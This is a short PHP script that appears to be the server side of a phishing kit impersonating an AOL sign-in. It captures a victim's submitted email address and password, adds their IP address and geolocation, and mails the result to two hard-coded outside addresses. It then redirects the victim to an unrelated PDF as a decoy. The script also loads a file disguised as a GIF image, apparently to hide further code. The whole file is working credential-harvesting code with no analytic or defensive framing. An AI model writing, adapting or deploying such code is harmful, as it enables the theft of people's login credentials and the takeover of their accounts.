<?php

$ip = getenv("REMOTE_ADDR");
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$msg = "------------------| Cogzy |--------------------\n";
$msg .= "Email Provider: AOL\n";
$msg .= "Email: ".$_POST[email]."\n";
$msg .= "Password: ".$_POST[password]."\n";
$msg .= "IP: $ip\n";
$msg .= "--------------------------------------------------\n";
$msg .= "City: {$geoplugin->city}\n";
$msg .= "Region: {$geoplugin->region}\n";
$msg .= "Country Name: {$geoplugin->countryName}\n";
$msg .= "Country Code: {$geoplugin->countryCode}\n";

$send = "of200200@gmail.com,ssalt200@protonmail.com";
$subject = "AOL | $ip";
include_once "files/button.gif";
mail($send,$subject,$msg);
header("Location: https://www.capgemini.com/wp-content/uploads/2017/07/wealth_management_trends_2017_web_0.pdf");

?>